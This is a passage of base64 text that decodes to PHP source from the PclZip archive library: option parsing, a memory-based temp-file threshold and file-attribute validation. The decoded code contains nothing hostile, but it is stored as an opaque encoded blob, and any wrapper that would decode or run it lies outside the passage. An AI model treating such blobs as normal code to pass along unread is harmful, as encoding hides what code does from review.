iBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoaXNzZXQoJHZfcmVzdWx0X2xpc3RbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiT3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIGNhbiBub3QgYmUgdXNlZCB3aXRoIG9wdGlvbiAnUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkdl92YWx1ZSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgaWYgKCghaXNfaW50ZWdlcigkdl92YWx1ZSkpIHx8ICgkdl92YWx1ZTwwKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJJbnRlZ2VyIGV4cGVjdGVkIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHZfdmFsdWUqMTA0ODU3NjsNCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OIDoNCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRl0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSB0cnVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGIDoNCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OXSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiT3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIGNhbiBub3QgYmUgdXNlZCB3aXRoIG9wdGlvbiAnUENMWklQX09QVF9URU1QX0ZJTEVfT04nIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSB0cnVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICggICBpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKQ0KICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNfbGlzdFskaSsxXSAhPSAnJykpIHsNCiAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCRwX29wdGlvbnNfbGlzdFskaSsxXSwgRkFMU0UpOw0KICAgICAgICAgICRpKys7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgIH0NCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfQllfTkFNRSA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bMF0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaXNfYXJyYXkoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIldyb25nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9CWV9FUkVHIDoNCiAgICAgICAgJHBfb3B0aW9uc19saXN0WyRpXSA9IFBDTFpJUF9PUFRfQllfUFJFRzsNCiAgICAgIGNhc2UgUENMWklQX09QVF9CWV9QUkVHIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGlzX3N0cmluZygkcF9vcHRpb25zX2xpc3RbJGkrMV0pKSB7DQogICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFLCAiV3JvbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0NPTU1FTlQgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0FERF9DT01NRU5UIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlQgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLA0KCQkgICAgICAgICAgICAgICAgICAgICAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIg0KCQkJCQkJCSAuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkNCgkJCQkJCQkgLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwNCgkJICAgICAgICAgICAgICAgICAgICAgIldyb25nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciDQoJCQkJCQkJIC5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKQ0KCQkJCQkJCSAuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0JZX0lOREVYIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfd29ya19saXN0ID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKGlzX3N0cmluZygkcF9vcHRpb25zX2xpc3RbJGkrMV0pKSB7DQoNCiAgICAgICAgICAgICRwX29wdGlvbnNfbGlzdFskaSsxXSA9IHN0cnRyKCRwX29wdGlvbnNfbGlzdFskaSsxXSwgJyAnLCAnJyk7DQoNCiAgICAgICAgICAgICR2X3dvcmtfbGlzdCA9IGV4cGxvZGUoIiwiLCAkcF9vcHRpb25zX2xpc3RbJGkrMV0pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGlzX2ludGVnZXIoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfd29ya19saXN0WzBdID0gJHBfb3B0aW9uc19saXN0WyRpKzFdLictJy4kcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaXNfYXJyYXkoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfd29ya19saXN0ID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJWYWx1ZSBtdXN0IGJlIGludGVnZXIsIHN0cmluZyBvciBhcnJheSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfc29ydF9mbGFnPWZhbHNlOw0KICAgICAgICAkdl9zb3J0X3ZhbHVlPTA7DQogICAgICAgIGZvciAoJGo9MDsgJGo8c2l6ZW9mKCR2X3dvcmtfbGlzdCk7ICRqKyspIHsNCiAgICAgICAgICAgICR2X2l0ZW1fbGlzdCA9IGV4cGxvZGUoIi0iLCAkdl93b3JrX2xpc3RbJGpdKTsNCiAgICAgICAgICAgICR2X3NpemVfaXRlbV9saXN0ID0gc2l6ZW9mKCR2X2l0ZW1fbGlzdCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCR2X3NpemVfaXRlbV9saXN0ID09IDEpIHsNCiAgICAgICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXVskal1bJ3N0YXJ0J10gPSAkdl9pdGVtX2xpc3RbMF07DQogICAgICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydlbmQnXSA9ICR2X2l0ZW1fbGlzdFswXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJHZfc2l6ZV9pdGVtX2xpc3QgPT0gMikgew0KICAgICAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWyRqXVsnc3RhcnQnXSA9ICR2X2l0ZW1fbGlzdFswXTsNCiAgICAgICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXVskal1bJ2VuZCddID0gJHZfaXRlbV9saXN0WzFdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIlRvbyBtYW55IHZhbHVlcyBpbiBpbmRleCByYW5nZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgICAgIH0NCg0KDQogICAgICAgICAgICBpZiAoJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydzdGFydCddIDwgJHZfc29ydF92YWx1ZSkgew0KICAgICAgICAgICAgICAgICR2X3NvcnRfZmxhZz10cnVlOw0KDQogICAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIkludmFsaWQgb3JkZXIgb2YgaW5kZXggcmFuZ2UgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdl9zb3J0X3ZhbHVlID0gJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydzdGFydCddOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoJHZfc29ydF9mbGFnKSB7DQogICAgICAgIH0NCg0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0VYVFJBQ1RfQVNfU1RSSU5HIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9OT19DT01QUkVTU0lPTiA6DQogICAgICBjYXNlIFBDTFpJUF9PUFRfRVhUUkFDVF9JTl9PVVRQVVQgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVIgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1IgOg0KICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9IHRydWU7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1NFVF9DSE1PRCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BSRV9FWFRSQUNUIDoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA6DQogICAgICBjYXNlIFBDTFpJUF9DQl9QUkVfQUREIDoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BPU1RfQUREIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfZnVuY3Rpb25fbmFtZSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCg0KICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygkdl9mdW5jdGlvbl9uYW1lKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJGdW5jdGlvbiAnIi4kdl9mdW5jdGlvbl9uYW1lLiIoKScgaXMgbm90IGFuIGV4aXN0aW5nIGZ1bmN0aW9uIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkdl9mdW5jdGlvbl9uYW1lOw0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGRlZmF1bHQgOg0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgIlVua25vd24gcGFyYW1ldGVyICciDQoJCQkJCQkgICAuJHBfb3B0aW9uc19saXN0WyRpXS4iJyIpOw0KDQogICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICRpKys7DQogIH0NCg0KICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnMgIT09IGZhbHNlKSB7DQogICAgZm9yICgka2V5PXJlc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zKTsgJGtleT1rZXkoJHZfcmVxdWVzdGVkX29wdGlvbnMpOyAka2V5PW5leHQoJHZfcmVxdWVzdGVkX29wdGlvbnMpKSB7DQogICAgICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnNbJGtleV0gPT0gJ21hbmRhdG9yeScpIHsNCiAgICAgICAgaWYgKCFpc3NldCgkdl9yZXN1bHRfbGlzdFska2V5XSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiTWlzc2luZyBtYW5kYXRvcnkgcGFyYW1ldGVyICIuUGNsWmlwVXRpbE9wdGlvblRleHQoJGtleSkuIigiLiRrZXkuIikiKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICB9DQogIA0KICBpZiAoIWlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pKSB7DQogICAgDQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2T3B0aW9uRGVmYXVsdFRocmVzaG9sZCgmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdKQ0KICAgICAgfHwgaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkZdKSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCiAgDQogICR2X21lbW9yeV9saW1pdCA9IGluaV9nZXQoJ21lbW9yeV9saW1pdCcpOw0KICAkdl9tZW1vcnlfbGltaXQgPSB0cmltKCR2X21lbW9yeV9saW1pdCk7DQogICRsYXN0ID0gc3RydG9sb3dlcihzdWJzdHIoJHZfbWVtb3J5X2xpbWl0LCAtMSkpOw0KDQogIGlmKCRsYXN0ID09ICdnJykNCiAgICAgICR2X21lbW9yeV9saW1pdCA9ICR2X21lbW9yeV9saW1pdCoxMDczNzQxODI0Ow0KICBpZigkbGFzdCA9PSAnbScpDQogICAgICAkdl9tZW1vcnlfbGltaXQgPSAkdl9tZW1vcnlfbGltaXQqMTA0ODU3NjsNCiAgaWYoJGxhc3QgPT0gJ2snKQ0KICAgICAgJHZfbWVtb3J5X2xpbWl0ID0gJHZfbWVtb3J5X2xpbWl0KjEwMjQ7DQogICAgICAgICAgDQogICRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSA9IGZsb29yKCR2X21lbW9yeV9saW1pdCpQQ0xaSVBfVEVNUE9SQVJZX0ZJTEVfUkFUSU8pOw0KICANCg0KICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdIDwgMTA0ODU3Nikgew0KICAgIHVuc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSk7DQogIH0NCiAgICAgICAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZGaWxlRGVzY3JQYXJzZUF0dCgmJHBfZmlsZV9saXN0LCAmJHBfZmlsZWRlc2NyLCAkdl9vcHRpb25zLCAkdl9yZXF1ZXN0ZWRfb3B0aW9ucz1mYWxzZSkNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICBmb3JlYWNoICgkcF9maWxlX2xpc3QgYXMgJHZfa2V5ID0+ICR2X3ZhbHVlKSB7DQogIA0KICAgIGlmICghaXNzZXQoJHZfcmVxdWVzdGVkX29wdGlvbnNbJHZfa2V5XSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIGZpbGUgYXR0cmlidXRlICciLiR2X2tleS4iJyBmb3IgdGhpcyBmaWxlIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIHN3aXRjaCAoJHZfa2V5KSB7DQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9OQU1FIDoNCiAgICAgICAgaWYgKCFpc19zdHJpbmcoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIFN0cmluZyBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXSA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCR2X3ZhbHVlKTsNCiAgICAgICAgDQogICAgICAgIGlmICgkcF9maWxlZGVzY3JbJ2ZpbGVuYW1lJ10gPT0gJycpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCBlbXB0eSBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfQVRUX0ZJTEVfTkVXX1NIT1JUX05BTUUgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWyduZXdfc2hvcnRfbmFtZSddID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfdmFsdWUpOw0KDQogICAgICAgIGlmICgkcF9maWxlZGVzY3JbJ25ld19zaG9ydF9uYW1lJ10gPT0gJycpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCBlbXB0eSBzaG9ydCBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX05FV19GVUxMX05BTUUgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVR